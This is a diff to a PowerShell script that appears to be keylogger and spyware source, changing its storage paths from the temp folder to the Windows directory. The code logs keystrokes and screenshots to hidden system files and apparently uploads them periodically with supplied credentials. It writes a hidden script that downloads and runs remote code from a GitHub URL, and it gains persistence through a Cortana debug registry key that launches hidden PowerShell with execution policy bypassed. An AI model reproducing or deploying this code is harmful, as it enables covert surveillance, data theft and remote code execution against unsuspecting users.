@@ -18,7 +18,7 @@ $functions =  {
 "@ 
         
         $getKeyState = Add-Type -memberDefinition $signature -name "Newtype" -namespace newnamespace -passThru
-        $filename = "$env:temp\key.log"
+        $filename = "$env:windir\key.log"
         fsutil file createnew $filename 0
         (Get-ChildItem $filename).Attributes = "Hidden","System"
         while ($true) 
@@ -98,7 +98,7 @@ $functions =  {
             $password
         )
         
-        $filename = "$env:temp\key.log"
+        $filename = "$env:windir\key.log"
         while($true) 
         { 
             Start-Sleep -Seconds 600
@@ -252,7 +252,7 @@ $functions =  {
         {
             Start-Sleep -Seconds 600
             
-            $files = Get-ChildItem "$env:TEMP\ZZXXCCVV-*.png" -Hidden
+            $files = Get-ChildItem "$env:windir\ZZXXCCVV-*.png" -Hidden
             
             if($files.Count)
             {
@@ -298,7 +298,7 @@ $functions =  {
         while($true)
         {
             $guid = [Guid]::newGuid()
-            $path = "$env:TEMP\ZZXXCCVV-$guid.png"
+            $path = "$env:windir\ZZXXCCVV-$guid.png"
             
             $width = 0;
             $height = 0;
@@ -359,18 +359,18 @@ $functions =  {
         while($true)
         {
             $modulename = "a.ps1"
-            $modulenamepath = "$env:TEMP\$modulename"
+            $modulenamepath = "$env:windir\$modulename"
             
             if(-Not ([System.IO.File]::Exists($modulenamepath)))
             {
-                Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/keys2.ps1"))' -Force $env:TEMP\$modulename
-                Out-File -InputObject "Invoke-Command -ScriptBlock ([scriptblock]::Create(`$scriptPath)) -ArgumentList '$username', '$password'" -Append -NoClobber $env:TEMP\$modulename
-                $modulenamefile = Get-Item $env:TEMP\$modulename
+                Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/keys2.ps1"))' -Force $env:windir\$modulename
+                Out-File -InputObject "Invoke-Command -ScriptBlock ([scriptblock]::Create(`$scriptPath)) -ArgumentList '$username', '$password'" -Append -NoClobber $env:windir\$modulename
+                $modulenamefile = Get-Item $env:windir\$modulename
                 $modulenamefile.Attributes = "Hidden","System"
             }
             
             $cortana = Get-AppxPackage | Select-String "Microsoft.Windows.Cortana"
-            New-Item -Path HKCU:Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\$cortana -Value "C:\windows\system32\cmd.exe /C powershell -noexit -nologo -WindowStyle Hidden -executionpolicy bypass -command $env:temp\$modulename" -force
+            New-Item -Path HKCU:Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\$cortana -Value "C:\windows\system32\cmd.exe /C powershell -noexit -nologo -WindowStyle Hidden -executionpolicy bypass -command $env:windir\$modulename" -force
             
             Start-Sleep -Seconds 5
         }
